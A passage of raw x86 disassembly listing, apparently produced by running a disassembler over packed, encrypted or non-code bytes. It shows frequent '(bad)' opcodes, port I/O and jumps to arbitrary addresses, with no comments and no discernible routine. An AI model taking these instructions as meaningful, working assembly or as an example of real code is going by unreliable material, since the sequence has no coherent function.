  408715:	xchg   BYTE PTR [edi-0x52],ah
  408718:	shr    BYTE PTR [eax-0x77],1
  40871b:	cmp    eax,0x56808392
  408720:	push   esi
  408721:	push   ebx
  408722:	ss ja  0x4086f9
  408725:	add    cl,BYTE PTR [ebp+0x25]
  408728:	fwait
  408729:	stos   BYTE PTR es:[edi],al
  40872a:	sub    ebp,ebp
  40872c:	cmp    bl,BYTE PTR [edi]
  40872e:	pop    eax
  40872f:	call   0x1ace131a
  408734:	jl     0x408715
  408736:	xchg   ebx,eax
  408737:	jecxz  0x408742
  408739:	add    dh,dl
  40873b:	ins    DWORD PTR es:[edi],dx
  40873c:	and    bl,ch
  40873e:	inc    edx
  40873f:	push   es
  408740:	cs sub al,0x77
  408743:	pminub mm6,QWORD PTR [edi]
  408746:	addr16 jmp 0x408731
  408749:	and    al,0x46
  40874b:	mov    fs,WORD PTR [eax-0x2e250a28]
  408751:	test   al,0xa6
  408753:	cdq    
  408754:	imul   edi,DWORD PTR [ebx],0xe0b2f7b3
  40875a:	add    al,0xb0
  40875c:	out    0xd7,eax
  40875e:	scas   eax,DWORD PTR es:[edi]
  40875f:	adc    DWORD PTR [edi-0x12612b74],edi
  408765:	pop    eax
  408766:	lds    ecx,FWORD PTR ds:[edi+eax*2-0x6e]
  40876b:	xlat   BYTE PTR ds:[ebx]
  40876c:	cwde   
  40876d:	mov    eax,0x7d9f9419
  408772:	test   DWORD PTR [edx+0x4],edi
  408775:	call   FWORD PTR [esi-0x532fb237]
  40877b:	shl    BYTE PTR [ebp+0x36],cl
  40877e:	loop   0x4087a5
  408780:	into   
  408781:	(bad)  
  408782:	jl     0x4087ec
  408784:	in     eax,0x18
  408786:	mov    ds:0x6a1e9abe,al
  40878b:	test   al,0x27
  40878d:	mov    bl,0x47
  40878f:	cmp    al,0xb7
  408791:	push   ecx
  408792:	in     eax,dx
  408793:	cwde   
  408794:	or     al,0xf2
  408796:	(bad)  
  408797:	push   es
  408798:	or     DWORD PTR [esi-0x2b],ebp
  40879b:	aam    0x15
  40879d:	xchg   edi,eax
  40879e:	dec    ebp
  40879f:	xchg   ebp,eax
  4087a0:	stc    
  4087a1:	rol    DWORD PTR [ebp+0x3c],0xc
  4087a5:	xchg   BYTE PTR [eax+edi*8+0x60],bl
  4087a9:	add    BYTE PTR [esi],bh
  4087ab:	xchg   edi,eax
  4087ac:	(bad)  
  4087ad:	add    eax,0x262c4c0
  4087b2:	jb     0x408785
  4087b4:	xor    BYTE PTR [edx-0x382c4b7a],ah
  4087ba:	xchg   esp,eax
  4087bb:	loope  0x4087ed
  4087bd:	fstp   TBYTE PTR [ecx]
  4087bf:	fs or  dl,ah
  4087c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087c3:	repnz push ebx
  4087c5:	pop    eax
  4087c6:	and    edx,DWORD PTR [ebp+edi*2-0x5c9e31c9]
  4087cd:	loop   0x408802
  4087cf:	and    al,0x1c
  4087d1:	xchg   edx,eax
  4087d2:	xchg   ecx,eax
  4087d3:	mov    al,0x71
  4087d5:	bound  edi,QWORD PTR [ecx+0xea8d30b]
  4087db:	mov    ds:0xbc2587e9,al
  4087e0:	sub    bh,bh
  4087e2:	mov    al,ds:0xd0a794ea
  4087e7:	xlat   BYTE PTR ds:[ebx]
  4087e8:	ret    
  4087e9:	mov    ebx,0x364cacb3
  4087ee:	js     0x4087ec
  4087f0:	neg    DWORD PTR [ebp+0x71297e44]
  4087f6:	sub    dh,BYTE PTR [edi]
  4087f8:	mov    ebx,fs
  4087fa:	mov    edx,0x96486f03
  4087ff:	fwait
  408800:	add    eax,0x11d5c60e
  408805:	lea    edi,[esp+eax*4]
  408808:	(bad)  
  40880a:	jb     0x40887c
  40880c:	pop    edi
  40880d:	(bad)  
  40880e:	sar    BYTE PTR [ebp-0x3a],1
  408811:	dec    edi
  408812:	jp     0x408821
  408814:	or     al,0xd0
  408816:	or     ebp,DWORD PTR [ebx]
  408818:	jno    0x4087bb
  40881a:	shr    BYTE PTR [ebx],cl
  40881c:	adc    DWORD PTR [edi],ebx
  40881e:	sti    
  40881f:	ja     0x40887d
  408821:	stos   BYTE PTR es:[edi],al
  408822:	lods   al,BYTE PTR ds:[esi]
  408823:	jp     0x408866
  408825:	mov    ecx,0xb74bc68f
  40882a:	inc    esi
  40882b:	dec    esp
  40882c:	sub    bh,BYTE PTR [edi]
  40882e:	imul   edx,DWORD PTR [edx],0xffffffa1
  408831:	sub    esi,esp
  408833:	scas   eax,DWORD PTR es:[edi]
  408834:	mov    bh,0xf
  408836:	add    ebx,edx
  408838:	mov    bh,0xb8
  40883a:	and    BYTE PTR [ecx-0x254fc1f6],cl
  408840:	cmp    DWORD PTR [edi],ebp
  408842:	ins    DWORD PTR es:[edi],dx
  408843:	inc    edi
  408844:	adc    ebp,DWORD PTR [edx-0x51b57db0]
  40884a:	mov    esi,0x99001327
  40884f:	out    0x3d,eax
  408851:	psubsb mm4,mm1
  408854:	mov    DWORD PTR [edi-0x76176855],esp
  40885a:	jl     0x408814
  40885c:	stos   DWORD PTR es:[edi],eax
  40885d:	adc    ah,ch
  40885f:	dec    eax
  408860:	in     eax,0x71
  408862:	jg     0x4088e1
  408864:	addr16 mov ecx,0x5597f662
  40886a:	rcl    DWORD PTR [edi],1
  40886c:	or     eax,0xed9097a3
  408871:	es out 0xbc,eax
  408874:	adc    eax,0x99e05cd3
  408879:	sbb    cl,dh
  40887b:	retf   0xd6c3
  40887e:	dec    edi
  40887f:	adc    DWORD PTR [edx-0xb],edx
  408882:	in     al,dx
  408883:	sbb    dl,BYTE PTR [ecx-0x61c29178]
  408889:	xchg   ecx,eax
  40888a:	jo     0x4088c0
  40888c:	bound  esp,QWORD PTR [edx]
  40888e:	rcl    ebp,0xae
  408891:	add    al,BYTE PTR [ebx+0x7a2f7836]
  408897:	rcr    cl,0xff
  40889a:	mov    edx,0x2a969105
  40889f:	lock add BYTE PTR [edx-0x78],al
  4088a3:	in     al,0x82
  4088a5:	pop    ebp
  4088a6:	adc    ch,cl
  4088a8:	push   es
  4088a9:	pop    eax
  4088aa:	xchg   edi,eax
  4088ab:	sbb    cl,al
  4088ad:	inc    esp
  4088ae:	adc    eax,0xa5e1137a
  4088b3:	push   ebp
  4088b4:	xchg   ecx,eax
  4088b5:	mov    edi,0x7d43af08
  4088ba:	iret   
  4088bb:	adc    BYTE PTR [esi+0x5f],bh
  4088be:	pop    ecx
  4088bf:	fwait
  4088c0:	sub    edi,esp
  4088c2:	and    al,0xa5
  4088c4:	pop    ss
  4088c5:	stos   DWORD PTR es:[edi],eax
  4088c6:	cmp    ecx,ecx
  4088c8:	mov    ds,ebx
  4088ca:	adc    bl,BYTE PTR [ecx-0x37a1381b]
  4088d0:	in     eax,dx
  4088d1:	jnp    0x408906
  4088d3:	mov    bh,0x40
  4088d5:	pop    eax
  4088d6:	mov    esp,0xa9f7b91d
  4088db:	in     al,0xd1
  4088dd:	fnclex 
  4088df:	jo     0x408891
  4088e1:	jl     0x4088f0
  4088e3:	fld    QWORD PTR [esp+ecx*4-0x475039ed]
  4088ea:	jne    0x408896
  4088ec:	sahf   
  4088ed:	outs   dx,DWORD PTR ds:[esi]
  4088ee:	or     ah,BYTE PTR [edi-0x1b]
  4088f1:	and    al,0x2d
  4088f3:	test   DWORD PTR [edx+0x5952fb7b],esi
  4088f9:	sub    eax,0xda9cb2c8
  4088fe:	leave  
  4088ff:	and    BYTE PTR [eax-0x46d12b3c],bl
  408905:	mov    WORD PTR [eax-0x6de76d77],ds
  40890b:	add    al,0x61
  40890d:	ja     0x4088a1
  40890f:	repnz mov esp,0x54c7bb42
  408915:	inc    edi
  408916:	inc    edi
  408917:	xchg   edx,eax
  408918:	lods   eax,DWORD PTR ds:[esi]
  408919:	(bad)  
  40891a:	loope  0x4088ae
  40891c:	mov    dl,0xe4
  40891e:	nop
  40891f:	adc    DWORD PTR [edi],ecx
  408921:	cmp    edx,DWORD PTR [edx+0x4f]
  408924:	adc    dl,bl
  408926:	push   ebx
  408927:	xchg   esp,eax
  408928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408929:	push   0x68
  40892b:	ds pop ecx
  40892d:	pop    ebx
  40892e:	or     ah,bh
  408930:	cdq    
  408931:	adc    al,0x8
  408933:	add    al,0x8a
  408935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408936:	sub    ebp,DWORD PTR [edi-0x1e]
  408939:	and    al,0x32
  40893b:	adc    esp,DWORD PTR [ebp+ebx*1-0x34]
  40893f:	aad    0x4
  408941:	addr16 xchg ecx,esp
  408944:	inc    eax
  408945:	(bad)  
  408946:	jmp    0x4088e7
  408948:	pop    ds
  408949:	adc    ch,0xcc
  40894c:	xor    eax,DWORD PTR [eax+0xb]
  40894f:	jns    0x408988
  408951:	xadd   BYTE PTR [ebx],dl
  408954:	fist   DWORD PTR [ecx+0x46]
  408957:	test   al,0x6d
  408959:	out    dx,eax
  40895a:	xor    ah,ch
  40895c:	and    esp,eax
  40895e:	inc    ebp
  40895f:	push   ds
  408960:	fldenv [edi+0x19]
  408963:	sbb    BYTE PTR [edx],al
  408965:	or     ecx,edi
  408967:	mov    bh,0x4b
  408969:	aad    0x8c
  40896b:	push   cs
  40896c:	(bad)  
  40896d:	pop    ebp
  40896e:	inc    edi
  40896f:	ret    
  408970:	retf   
  408971:	mov    edi,0x4fdd2148
  408976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408977:	out    dx,eax
  408978:	rcl    ah,cl
  40897a:	clc    
  40897b:	fstp   DWORD PTR [edx+ebx*8]
  40897e:	pushf  
  40897f:	imul   esi,DWORD PTR [edx],0xfffffffa
  408982:	enter  0xd9c5,0x86
  408986:	xor    al,0xb0
  408988:	mov    BYTE PTR es:[ebx-0x5c],bl
  40898c:	jo     0x4089b8
  40898e:	mov    dl,0x31
  408990:	mov    al,ds:0x842a9a06
  408995:	xchg   esi,eax
  408996:	mov    ch,0xaa
  408998:	test   esi,edx
  40899a:	dec    edi
  40899b:	pop    ss
  40899c:	repz xor dh,cl
  40899f:	sbb    eax,0x1eb0f18d
  4089a4:	dec    edx
  4089a5:	retf   0xc37f
  4089a8:	out    0x8c,eax
  4089aa:	popa   
  4089ab:	dec    esi
  4089ac:	iret   
  4089ad:	scas   eax,DWORD PTR es:[edi]
  4089ae:	push   ebp
  4089af:	jmp    0x1913:0x57d2332
  4089b6:	je     0x408a27
  4089b8:	pop    ds
  4089b9:	imul   esi,DWORD PTR [edi-0x3a17342b],0x38
  4089c0:	fiadd  DWORD PTR [eax]
  4089c2:	jmp    0x4089fd
  4089c4:	enter  0x6a25,0xae
  4089c8:	xor    DWORD PTR [edx+0x4163463b],0x52
  4089cf:	cmp    BYTE PTR es:[esp+eiz*2],0x62
  4089d4:	jmp    0x408a38
  4089d6:	jmp    0xe97c6bbf
  4089db:	retf   0x41b1
  4089de:	xor    al,0x62
  4089e0:	or     al,dl
  4089e2:	lds    esp,FWORD PTR [eax-0x9]
  4089e5:	bound  ebp,QWORD PTR [ebp-0x58]
  4089e8:	retf   
  4089e9:	sub    ch,BYTE PTR [eax-0x4d]
  4089ec:	mov    dh,0x3d
  4089ee:	jmp    0x7dbe8f7f
  4089f3:	lahf   
  4089f4:	(bad)
  4089f8:	ds shl esi,0x62
  4089fc:	fnstenv [esi]
  4089fe:	jg     0x4089bc
  408a00:	push   edx
  408a01:	popf   
  408a02:	and    edx,DWORD PTR [ebp-0x72]
  408a05:	adc    DWORD PTR [ecx+esi*4+0x73],edx
  408a09:	das    
  408a0a:	push   ebp
  408a0b:	mov    ss,WORD PTR [esi-0x27]
  408a0e:	push   ebx
  408a0f:	pop    edx
  408a10:	repnz arpl dx,sp
  408a13:	js     0x408a8d
  408a15:	jmp    0xb44657f0
  408a1a:	add    DWORD PTR [edi],esi
  408a1c:	lahf   
  408a1d:	pop    edx
  408a1e:	js     0x408a5c
  408a20:	cmp    DWORD PTR [ebp-0x10],esi
  408a23:	jmp    0x4089fc
  408a25:	mov    cl,0x98
  408a27:	rol    esi,cl
  408a29:	dec    eax
  408a2a:	sbb    eax,0xbe6d1f92
  408a2f:	bnd ret 0xbb3b
  408a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a34:	mov    cl,0x5e
  408a36:	into   
  408a37:	jmp    0x1a9d:0x6bdd2931
  408a3e:	aas    
  408a3f:	and    al,0xcf
  408a41:	(bad)  
  408a42:	imul   esp,DWORD PTR [edx],0xffffff8e
  408a45:	jbe    0x4089c8
  408a47:	adc    ebp,ebx
  408a49:	in     al,0xef
  408a4b:	hlt    
  408a4c:	pop    es
  408a4d:	inc    edx
  408a4e:	hlt    
  408a4f:	daa    
  408a50:	icebp  
  408a51:	sbb    eax,0xc7576841
  408a56:	dec    edx
  408a57:	xor    DWORD PTR [ebx+0x18],esi
  408a5a:	fmulp  st(0),st
  408a5c:	test   eax,0x8a7ef0fa
  408a61:	std    
  408a62:	xor    bl,bh
  408a64:	xchg   ecx,eax
  408a65:	jg     0x408ab6
  408a67:	jmp    0xdcb395e4
  408a6c:	push   0x8c54e7f2
  408a71:	adc    esi,DWORD PTR [edx]
  408a73:	call   0xd1d6:0xb0b81ce9
  408a7a:	sub    BYTE PTR [ecx+0x26531f0c],cl
  408a80:	mov    BYTE PTR [eax+0x6a],bl
  408a83:	pop    edx
  408a84:	test   eax,0xf19889ee
  408a89:	fsubr  st(7),st
  408a8b:	pop    ebx
  408a8c:	aad    0x21
  408a8e:	mov    ebp,0x74f07f5a
  408a93:	cmc    
  408a94:	das    
  408a95:	imul   edx,DWORD PTR [ecx-0x70b27d9],0xffffffd5
  408a9c:	fucomip st,st(4)
  408a9e:	je     0x408ab1
  408aa0:	pop    esi
  408aa1:	xchg   ebp,eax
  408aa2:	out    0xbe,al
  408aa4:	pusha  
  408aa5:	xchg   esp,eax
  408aa6:	add    al,0x52
  408aa8:	push   es
  408aa9:	or     cl,ch
  408aab:	add    eax,DWORD PTR [eax+0x38]
  408aae:	cmp    al,0x2f
  408ab0:	loopne 0x408a4e
  408ab2:	adc    DWORD PTR [edi+0xa],ebx
  408ab5:	(bad)  
  408ab6:	or     eax,0xb32c48fc
  408abb:	jns    0x408aeb
  408abd:	mov    esp,0x739d9b2b
  408ac2:	inc    ebp
  408ac3:	(bad)  
  408ac5:	mul    BYTE PTR [ebx+0xa]
  408ac8:	clc    
  408ac9:	retf   0x5b14
  408acc:	(bad)  
  408acd:	jg     0x408ae8
  408acf:	inc    ecx
  408ad0:	cmp    DWORD PTR [edx],ecx
  408ad2:	or     BYTE PTR [ebx+0x1d],dl
  408ad5:	mov    cl,0x45
  408ad7:	not    DWORD PTR [ebp+0x34]
  408ada:	mov    dl,0x65
  408adc:	sbb    al,0xf4
  408ade:	test   DWORD PTR [edx+0x22],eax
  408ae1:	sahf   
  408ae2:	mov    bh,0xee
  408ae4:	mov    eax,0xc478c158
  408ae9:	cs mov ecx,0xcd1ee99d
  408aef:	loop   0x408af2
  408af1:	xor    DWORD PTR [edi+0xc49f4c5],edi
  408af7:	jmp    0x408aeb
  408af9:	shl    BYTE PTR [ebx],cl
  408afb:	inc    esi
  408afc:	ins    BYTE PTR es:[edi],dx
  408afd:	add    al,0x41
  408aff:	pop    edi
  408b00:	push   esp
  408b01:	jge    0x408b77
  408b03:	shl    BYTE PTR [ebp-0x6d],cl
  408b06:	and    DWORD PTR [ebp-0xd],ebx
  408b09:	and    eax,0x8cf2658f
  408b0e:	cmp    DWORD PTR [edi-0x4890a0ee],0x11014a19
  408b18:	or     al,0x71
  408b1a:	icebp  
  408b1b:	scas   eax,DWORD PTR es:[edi]
  408b1c:	xor    BYTE PTR [edx-0x202e9581],al
  408b22:	push   ss
  408b23:	or     dl,BYTE PTR [esi]
  408b25:	mov    ds:0x5b98244c,eax
  408b2a:	ret    0x9d18
  408b2d:	pop    esp
  408b2e:	mov    bh,0xe3
  408b30:	cmp    edx,DWORD PTR [edx+eiz*8]
  408b33:	fcomp  DWORD PTR [ebp-0x7c2db52e]
  408b39:	push   esi
  408b3a:	cmp    al,0x27
  408b3c:	dec    eax
  408b3d:	imul   ebx,DWORD PTR [ecx-0x8a069ed],0xf7c12759
  408b47:	push   0xffffffa7
  408b49:	fwait
  408b4a:	cwde   
  408b4b:	sbb    ch,BYTE PTR ds:0x45e8dff0
  408b51:	in     eax,0x7f
  408b53:	push   ds
  408b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b55:	mov    bl,0x49
  408b57:	mov    ebp,0x28ddacd4
  408b5c:	xchg   DWORD PTR [ebx+0x35bd3fca],ebp
  408b62:	mov    al,ds:0x7019df20
  408b67:	jp     0x408b09
  408b69:	stos   BYTE PTR es:[edi],al
  408b6a:	pop    eax
  408b6b:	daa    
  408b6c:	fstp   QWORD PTR [ecx-0x7bdff31a]
  408b72:	inc    eax
  408b73:	(bad)  
  408b74:	jb     0x408b92
  408b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b77:	jae    0x408bc4
  408b79:	sub    esi,ecx
  408b7b:	in     al,dx
  408b7c:	cli    
  408b7d:	sub    edx,0x7f
  408b80:	cmp    ecx,DWORD PTR [ecx+eiz*4]
  408b83:	sub    esi,ecx
  408b85:	pusha  
  408b86:	adc    dl,dh
  408b88:	sbb    BYTE PTR [ebp+0x47],dh
  408b8b:	push   esp
  408b8c:	imul   esi,esi,0xdf27b16c
  408b92:	into   
  408b93:	and    DWORD PTR [esi],eax
  408b95:	shl    ecx,1
  408b97:	pop    edi
  408b98:	call   0x8d8a251f
  408b9d:	std    
  408b9e:	pop    ds
  408b9f:	mov    ebp,0x5a04501c
  408ba4:	dec    esi
  408ba5:	cli    
  408ba6:	es mov dl,0xbe
  408ba9:	jle    0x408c1d
  408bab:	push   ebx
  408bac:	jmp    0x408c19
  408bae:	sub    edx,DWORD PTR [ebx+0x6]
  408bb1:	dec    eax
  408bb2:	and    esp,DWORD PTR [ecx+ecx*8+0x18]
  408bb6:	leave  
  408bb7:	lea    eax,[edx+0x6d]
  408bba:	mov    eax,ds:0xd428f68d
  408bbf:	test   al,0x79
  408bc1:	jb     0x408bb1
  408bc3:	(bad)  
  408bc4:	lods   al,BYTE PTR ds:[esi]
  408bc5:	ret    0x8374
  408bc8:	leave  
  408bc9:	test   eax,0x31668e2b
  408bce:	xchg   edx,eax
  408bcf:	outs   dx,BYTE PTR ds:[esi]
  408bd0:	add    ebp,edi
  408bd2:	jl     0x408bfc
  408bd4:	(bad)  
  408bd5:	shr    DWORD PTR [edi-0x7],1
  408bd8:	sub    ebp,DWORD PTR [ecx-0x5d280ed8]
  408bde:	jmp    0x25559f29
  408be3:	arpl   dx,si
  408be5:	mov    ds:0xa578d95e,al
  408bea:	stos   DWORD PTR es:[edi],eax
  408beb:	push   es
  408bec:	jb     0x408c28
  408bee:	lahf   
  408bef:	dec    edi
  408bf0:	retf   
  408bf1:	frstor [ebp-0x24292cc8]
  408bf7:	fwait
  408bf8:	ret    
  408bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bfa:	hlt    
  408bfb:	int    0xb9
  408bfd:	dec    ebp
  408bfe:	imul   esp,DWORD PTR [esi+0x6fd3a1e3],0xab9daf25
  408c08:	pop    es
  408c09:	pusha  
  408c0a:	and    al,0xae
  408c0c:	shl    edi,1
  408c0e:	and    DWORD PTR [eax-0x73],esp
  408c11:	cmp    esp,DWORD PTR fs:[edi+eax*4-0xa332622]
  408c19:	stos   DWORD PTR es:[edi],eax
  408c1a:	repz sti 
  408c1c:	in     al,0x75
  408c1e:	rcl    DWORD PTR [edi+0x4d],cl
  408c21:	pop    esi
  408c22:	popa   
  408c23:	dec    edi
  408c24:	pop    ecx
  408c25:	push   edi
  408c26:	cdq    
  408c27:	jl     0x408ca7
  408c29:	or     eax,edi
  408c2b:	push   cs
  408c2c:	inc    esi
  408c2d:	test   eax,0xc334a875
  408c32:	out    dx,eax
  408c33:	int3   
  408c34:	je     0x408c78
  408c36:	or     ebp,DWORD PTR ds:0xeef020e7
  408c3c:	push   ecx
  408c3d:	xor    ah,0xa2
  408c40:	dec    edi
  408c41:	sub    DWORD PTR [ebp+0x0],esi
  408c44:	mov    ds:0xd659f161,eax
  408c49:	sbb    al,0xb0
  408c4b:	mov    DWORD PTR [edi],esp
  408c4d:	push   ds
  408c4e:	sbb    eax,0x3a5d77d9
  408c53:	sub    ah,bh
  408c55:	mov    WORD PTR [ebx+0xb],gs
  408c58:	lock pop ds
  408c5a:	nop
  408c5b:	call   0xc92d:0x16094cc8
  408c62:	(bad)  [ebp+0x261d6de0]
  408c68:	shr    DWORD PTR [edi-0x39845e93],cl
  408c6e:	and    DWORD PTR ds:0x4812b6e7,0xffffffea
  408c75:	jge    0x408ce4
  408c77:	jp     0x408c3c
  408c79:	int    0xce
  408c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c7c:	outs   dx,DWORD PTR ds:[esi]
  408c7d:	xor    eax,0x9816acfe
  408c82:	mov    BYTE PTR [ebp-0x67599c61],bh
  408c88:	adc    DWORD PTR es:[edi+0x3d],0x402f1d65
  408c90:	pop    esp
  408c91:	fisttp QWORD PTR [ebx+0x37]
  408c94:	pop    esp
  408c95:	fisttp WORD PTR [edx]
  408c97:	and    al,0x33
  408c99:	xlat   BYTE PTR ds:[ebx]
  408c9a:	je     0x408c21
  408c9c:	shl    BYTE PTR [edx+esi*8-0x382242f5],1
  408ca3:	arpl   WORD PTR [ebx],si
  408ca5:	pop    edx
  408ca6:	test   al,0x77
  408ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca9:	out    0xd9,al
  408cab:	mov    edx,0x7439fdec
  408cb0:	mov    ds:0xc5ae5fa0,al
  408cb5:	lds    esi,FWORD PTR [ebp+0x4c57a0e]
  408cbb:	add    esi,0x568adc2b
  408cc1:	push   ebx
  408cc2:	pusha  
  408cc3:	lahf   
  408cc4:	sub    bh,dh
  408cc6:	(bad)  
  408cc7:	mov    ds:0xd7152bc9,al
  408ccc:	sub    edx,esi
  408cce:	mov    dl,0x83
  408cd0:	sub    ebx,ebx
  408cd2:	mov    ah,dh
  408cd4:	dec    eax
  408cd5:	fadd   st,st(7)
  408cd7:	pop    ecx
  408cd8:	push   ebx
  408cd9:	ss jne 0x408cbf
  408cdc:	cmp    eax,0xda987316
  408ce1:	iret   
  408ce2:	adc    BYTE PTR [ebx+ebp*2],al
  408ce5:	int    0x4c
  408ce7:	je     0x408d65
  408ce9:	push   ecx
  408cea:	popa   
  408ceb:	dec    esi
  408cec:	and    al,0xde
  408cee:	mov    ecx,0x7e633f2a
  408cf3:	adc    BYTE PTR [ebx+0x6d],bh
  408cf6:	or     BYTE PTR [ecx],ch
  408cf8:	test   eax,0xab0669d8
  408cfd:	test   DWORD PTR [ebx],0x1a200471
  408d03:	push   0xffffff84
  408d05:	jne    0x408d63
  408d07:	ss xchg esi,eax
  408d09:	inc    esp
  408d0a:	arpl   si,cx
  408d0c:	bound  ecx,QWORD PTR [ebx+0x24]
  408d0f:	jae    0x408ce5
  408d11:	inc    esi
  408d12:	ss pushf 
  408d14:	push   ebx
  408d15:	jl     0x408ccf
  408d17:	mov    ss,WORD PTR [ebx-0x61]
  408d1a:	mov    WORD PTR [edi+ebp*2+0x6a11a5bf],?
  408d21:	inc    eax
  408d22:	pop    esi
  408d23:	push   edi
  408d24:	pop    edx
  408d25:	mov    ebx,0x8c53ff54
  408d2a:	push   esi
  408d2b:	ror    ebp,cl
  408d2d:	ins    DWORD PTR es:[edi],dx
  408d2e:	(bad)  
  408d2f:	cmp    edx,DWORD PTR [eax-0x5970d2ef]
  408d35:	cmp    ch,BYTE PTR [edi+0x772ce45c]
  408d3b:	std    
  408d3c:	push   ecx
  408d3d:	jne    0x408d76
  408d3f:	(bad)  
  408d40:	loopne 0x408d6e
  408d42:	rcr    BYTE PTR [ebx+0x3],1
  408d45:	test   bh,bl
  408d47:	mov    eax,DWORD PTR [esp+edx*8-0x2d]
  408d4b:	jo     0x408da1
  408d4d:	jo     0x408d35
  408d4f:	sbb    DWORD PTR [eax],eax
  408d51:	out    0x1f,al
  408d53:	push   ebx
  408d54:	aaa    
  408d55:	mov    ebp,0x7341189d
  408d5a:	and    BYTE PTR [esi+0x63],ch
  408d5d:	dec    ebp
  408d5e:	inc    eax
  408d5f:	adc    eax,ebx
  408d61:	adc    cl,BYTE PTR [ecx-0x184aa4a7]
  408d67:	es mov cl,0x8
  408d6a:	neg    al
  408d6c:	je     0x408d42
  408d6e:	ror    ebp,1
  408d70:	leave  
  408d71:	jecxz  0x408cf7
  408d73:	xchg   esp,eax
  408d74:	or     al,0xba
  408d76:	sub    al,0xcb
  408d78:	repz mov eax,ds:0xa89e3cb0
  408d7e:	test   eax,0xffa828a2
  408d83:	adc    eax,0xf2f78828
  408d88:	pop    esi
  408d8a:	repz ja 0x408db0
  408d8d:	push   cs
  408d8e:	fcomip st,st(0)
  408d90:	and    edi,edi
  408d92:	fs inc edi
  408d94:	sbb    BYTE PTR [esi],bh
  408d96:	xor    cl,BYTE PTR [eax]
  408d98:	mov    ecx,0x653edd53
  408d9d:	(bad)  
  408d9e:	outs   dx,BYTE PTR ds:[esi]
  408d9f:	push   esi
  408da0:	(bad)
  408da3:	adc    al,0x39
  408da5:	mov    bh,0xd8
  408da7:	pop    ebp
  408da8:	neg    DWORD PTR [eax+eax*8-0x34]
  408dac:	repz mov edx,0x5b5c5764
  408db2:	icebp  
  408db3:	ret    0xfc82
  408db6:	jl     0x408d93
  408db8:	loop   0x408db7
  408dba:	imul   ebp,DWORD PTR [edi+0x5725b825],0xfffffffd
  408dc1:	inc    edi
  408dc2:	xchg   ebp,eax
  408dc3:	cmp    al,BYTE PTR [eax-0x24]
  408dc6:	shl    DWORD PTR [ebp+0x2f],0xcd
  408dca:	into   
  408dcb:	lods   al,BYTE PTR ds:[esi]
  408dcc:	mov    ch,0x5a
  408dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dcf:	out    dx,al
  408dd0:	inc    ecx
  408dd1:	mov    al,ds:0x7813090f
  408dd6:	jne    0x408e05
  408dd8:	cmp    BYTE PTR [ecx],dh
  408dda:	fsubr  QWORD PTR ds:0x7cc95af9
  408de0:	leave  
  408de1:	test   eax,0x3c44603b
  408de6:	xchg   esp,eax
  408de7:	pop    esi
  408de8:	lds    edx,FWORD PTR [eax+eiz*8-0x557b6558]
  408def:	cmp    al,0xe
  408df1:	int3   
  408df2:	pusha  
  408df3:	rcl    DWORD PTR [ecx],cl
  408df5:	dec    edi
  408df6:	push   ss
  408df7:	mov    esi,0x8737ed05
  408dfc:	add    WORD PTR [edx-0x19],bp
  408e00:	inc    eax
  408e01:	pcmpgtd mm3,mm6
  408e04:	aam    0x23
  408e06:	dec    esi
  408e07:	xchg   edx,eax
  408e08:	fstp   st(3)
  408e0a:	shl    bh,0xde
  408e0d:	mov    cs,WORD PTR [ebp-0x5f151769]
  408e13:	mov    edi,0x4d7b3a6
  408e18:	sahf   
  408e19:	or     eax,0xec024633
  408e1e:	add    al,0x2d
  408e20:	xor    esi,esp
  408e22:	xchg   edi,eax
  408e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e24:	push   eax
  408e25:	repnz mov al,0x69
  408e28:	mov    al,ds:0x2631a05b
  408e2d:	dec    ebx
  408e2e:	(bad)  
  408e2f:	test   eax,0xb64e920a
  408e34:	(bad)  
  408e35:	in     eax,0x7
  408e37:	out    0xac,al
  408e39:	(bad)  
  408e3a:	and    bh,BYTE PTR [ebx+0x2424542a]
  408e40:	outs   dx,BYTE PTR ds:[esi]
  408e41:	xchg   BYTE PTR [ecx+0x3c],ah
  408e44:	mov    DWORD PTR [edx+0x4c],eax
  408e47:	les    eax,FWORD PTR [edi-0x387fd0a1]
  408e4d:	sbb    DWORD PTR [ecx+edx*2-0x6a],0xdf96de0c
  408e55:	addr16 iret 
  408e57:	imul   esi,DWORD PTR [eax],0xae7839a7
  408e5d:	sbb    al,0x4f
  408e5f:	inc    edx
  408e60:	jmp    0x408eb4
  408e62:	mov    edx,0x4488351f
  408e67:	jbe    0x408e94
  408e69:	mov    DWORD PTR ds:0xa22271e6,ebx
  408e6f:	(bad)
  408e73:	sub    eax,DWORD PTR [edx+ecx*1-0x7a]
  408e77:	sbb    DWORD PTR ds:[edi-0x7a990551],0xffffffb3
  408e7f:	fs test al,0xe8
  408e82:	adc    cl,BYTE PTR [ebp-0xcb48d5d]
  408e88:	sub    eax,0x8ce2a2a3
  408e8d:	icebp  
  408e8e:	cld    
  408e8f:	or     ch,al
  408e91:	mov    dl,0xb8
  408e93:	addr16 retf 
  408e95:	icebp  
  408e96:	inc    esi
  408e97:	or     esi,esp
  408e99:	data16 std 
  408e9b:	push   ds
  408e9c:	adc    eax,0x746df6f
  408ea1:	mov    al,ds:0x537af25e
  408ea6:	add    DWORD PTR [esi-0x7fc1ece],eax
  408eac:	sbb    DWORD PTR [ecx-0x1e3c453],esp
  408eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eb3:	lea    ebx,[esi+0x28b5635f]
  408eb9:	mov    ecx,gs
  408ebb:	mov    esi,0xb999ece5
  408ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ec1:	int3   
  408ec2:	jp     0x408f3a
  408ec4:	stc    
  408ec5:	and    DWORD PTR [eax-0x32f7c7af],ebp
  408ecb:	fdivr  st,st(2)
  408ecd:	mov    esp,0x8d9504d9
  408ed2:	mov    ebp,0x3c31a697
  408ed7:	mov    ebp,0xcd4635ab
  408edc:	mov    ah,0x15
  408ede:	fwait
